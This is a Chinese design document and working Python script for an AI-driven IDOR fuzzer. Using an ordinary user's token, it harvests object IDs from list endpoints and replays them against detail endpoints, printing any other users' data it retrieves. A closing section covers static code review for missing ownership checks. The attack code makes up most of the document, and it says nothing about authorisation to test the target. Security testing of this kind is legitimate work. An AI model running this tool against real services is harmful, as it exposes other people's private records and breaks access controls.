# 🚀 API ID Chain Fuzzer 执行架构与伪代码实现思路

本工具的核心目标是：**实现从静态提取到动态漏洞验证（DAST）的无缝衔接。**
整个自动化探测机制分为三大模块：解析层、编排层与发包探测层。

## 1. 架构设计

### 模块 A: 路由与参数解析 (Parser)
- 依赖于 `java-route-mapper/scripts/spring_route_extractor.py`。
- 将生成的 `routes.json` 投递给新编写的 `id_chain_analyzer.py`。
- `id_chain_analyzer.py` 负责：
  1. **执行安全剔除**: 拦截所有包含 `delete`, `update`, `remove` 等修改数据库状态的接口。
  2. **构建串联图谱**: 将接口分为两类：
     - **Source (泄漏源)**: 带有 `list`, `page`, `search` 的 GET/POST 接口，预期返回 JSON 数组中包含目标 ID。
     - **Sink (受害者/靶点)**: 明确在 URL Params 或 Body 中需要传入类似 `userId`, `orderId` 的接口。

### 模块 B: AI 动态发包编排 (Fuzzer Orchestrator)
这部分由大模型 (AI) 通过执行特定的 Python 脚本或直接利用 HTTP 请求库来实现。

**步骤 1：获取基准权限 (Authentication)**
- 测试必须在一个普通用户的 Token/Cookie 环境下进行。

**步骤 2：信息收集与绑定 (Harvesting & ID Correlation)**
- AI 构造 HTTP 请求向 Source 接口发包（如 `/api/v1/users/list` 或 `/api/v1/orders/page`）。
- **【核心机制：动态 ID 金库与强关联原则】**：
  - **原则：根据一个 ID 查到的其他 ID，说明它们是强关联的，必须放在同一行。**
  - 解析响应 JSON 时，**绝不硬编码任何 ID 名称**。动态寻找所有以 `id` 结尾的字段（如 `userId`, `openId`, `doc_id`, `orgId`）。
  - **同级对象绑定**：只要这些字段出现在同一个 JSON Object 中，就认为它们属于同一个实体。
  - **级联绑定 (Cascading)**：如果用 `userId` 去请求详情接口 `/api/user/detail`，返回了 `deptId` 和 `roleId`，那么这些新查出的 ID 必须和原来的 `userId` **合并到同一行记录中**。
- 将这些强关联的字典作为一行记录，追加写入到本地持久化文件（如 `id_vault.jsonl`）中。
  - 示例 `id_vault.jsonl` 内容：
    ```json
    {"userId": "1001", "openId": "wx_abc", "orgId": "99", "deptId": "5"}
    {"orderId": "505", "userId": "1001", "merchantId": "88"}
    ```

**步骤 3：参数碰撞与越权验证 (Collision & Validation)**
- 遍历所有 Sink 接口。
- 读取 `id_vault.jsonl`。如果当前 Sink 接口需要传入 `[userId, orgId]`，引擎会遍历金库中的每一行，只要某一行同时拥有这两个键，就把对应的值取出来注入到请求中。

## 2. 核心 Fuzzer 伪代码 (Python)

```python
import requests
import json
import os

ATTACKER_TOKEN = "Bearer eyJhbG..."
ATTACKER_ID = "1008" # 仅用于在入库时排除自己的数据
BASE_URL = "http://target.com"
VAULT_FILE = "id_vault.jsonl"

with open("chain_graph.json", "r") as f:
    graph = json.load(f)

headers = {
    "Authorization": ATTACKER_TOKEN,
    "Content-Type": "application/json"
}

# ==========================================
# 阶段 1: 动态提取并持久化 ID 金库
# ==========================================
print("[*] Phase 1: Harvesting dynamic bound IDs into Vault...")

def save_to_vault(id_dict):
    # 将字典按行写入金库
    with open(VAULT_FILE, "a") as vf:
        vf.write(json.dumps(id_dict) + "\n")

# 清空旧金库
if os.path.exists(VAULT_FILE):
    os.remove(VAULT_FILE)

# 用于存储暂时的强关联记录，支持后续的级联扩充
memory_vault = []

for source in graph["sources_for_leakage"]:
    try:
        if source["method"] == "GET":
            res = requests.get(BASE_URL + source["path"], headers=headers, timeout=5)
            try:
                json_data = res.json()
                def extract_objects(obj):
                    if isinstance(obj, list):
                        for item in obj:
                            if isinstance(item, dict):
                                # 动态提取所有以 id 结尾的 key
                                id_dict = {k: v for k, v in item.items() if str(k).lower().endswith('id')}
                                # 如果字典不为空，且不全是自己的 ID，则认为它们是强关联的
                                if id_dict and not all(str(v) == ATTACKER_ID for v in id_dict.values()):
                                    # 检查是否能与 memory_vault 中已有的行进行“级联绑定”
                                    # （比如用 userId 查到了 deptId，那就把 deptId 补充到对应 userId 的那一行）
                                    merged = False
                                    for existing_row in memory_vault:
                                        # 寻找交集（比如都有 userId=1001）
                                        common_keys = set(id_dict.keys()) & set(existing_row.keys())
                                        if common_keys and all(id_dict[k] == existing_row[k] for k in common_keys):
                                            # 合并新的 ID 到同一行
                                            existing_row.update(id_dict)
                                            merged = True
                                            break
                                    if not merged:
                                        memory_vault.append(id_dict)
                            extract_objects(item)
                    elif isinstance(obj, dict):
                        for k, v in obj.items():
                            extract_objects(v)
                            
                extract_objects(json_data)
            except json.JSONDecodeError:
                pass
    except Exception as e:
        continue

# 最终将内存中已经合并/级联好的记录，写入持久化金库文件
for row in memory_vault:
    save_to_vault(row)

print(f"[+] Harvested {len(memory_vault)} correlated ID rows saved to {VAULT_FILE}.")

# ==========================================
# 阶段 2: 查阅金库并进行动态匹配 Fuzzing
# ==========================================
print("[*] Phase 2: Fuzzing Sinks with Vault records...")

# 将金库加载到内存
vault_records = []
if os.path.exists(VAULT_FILE):
    with open(VAULT_FILE, "r") as vf:
        for line in vf:
            vault_records.append(json.loads(line.strip()))

for sink in graph["sinks_for_exploitation"]:
    path = sink["path"]
    method = sink["method"]
    req_ids = sink["required_ids"] # 动态读取需要的 key，例如 ["doc_id", "userId"]
    
    # 从金库中筛选出能满足该 Sink 全部必填 ID 的行
    applicable_records = [rec for rec in vault_records if all(req_id in rec for req_id in req_ids)]
    
    for record in applicable_records[:5]:  # 每个接口挑 5 行数据测试
        target_url = BASE_URL + path
        if method == "GET":
            # 动态拼接: ?doc_id=xxx&userId=yyy
            query_str = "&".join([f"{k}={record[k]}" for k in req_ids])
            target_url += f"?{query_str}"
            
            res = requests.get(target_url, headers=headers)
            
            if res.status_code == 200 and str(record[req_ids[0]]) in res.text:
                print(f"[!!!] VULNERABILITY FOUND (IDOR):")
                print(f"      Endpoint: {target_url}")
                print(f"      Payload from Vault: {record}")
                print(f"      Leaked Info: {res.text[:100]}...")
```

## 3. 落地建议
对于纯白盒（SAST）场景，AI 可以在提取出 `chain_graph.json` 后，**直接审阅对应 Controller 的源码**。
AI 不需要真的发包，只需做以下推理：
1. 接口 A (Source) 确实没有加 `@RequiresRoles("ADMIN")`，普通用户可查。
2. 接口 B (Sink) 接收了 `userId`，但代码里直接调用了 `userService.getById(userId)`，**完全没有进行** `if (currentLoginId != userId)` 的判断逻辑。
3. 结论：存在 IDOR 漏洞。

这是一种将 DAST 动态思想转化为 SAST 静态追踪规则的完美范例。